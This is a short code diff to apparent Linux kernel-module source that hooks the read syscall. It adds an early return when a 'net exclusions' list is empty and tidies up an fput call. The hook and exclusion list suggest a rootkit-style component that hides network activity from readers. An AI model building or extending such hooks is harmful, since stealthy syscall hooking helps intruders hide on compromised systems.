@@ -24,6 +24,9 @@ asmlinkage int hook_read(const struct pt_regs *regs) {
 
 
 long hook_read_impl(unsigned int fd, char __user *buf, long ret) {
+    if (net_exclusions_are_empty()) {
+            return ret; // do nothing
+    } 
     ssize_t ret2 = ret;
     struct file *f = fget(fd);
 
@@ -71,7 +74,8 @@ long hook_read_impl(unsigned int fd, char __user *buf, long ret) {
             return ret2;
         }
     }
-    if (f)
+    if (f) {
         fput(f);
+    }
     return ret;
 }
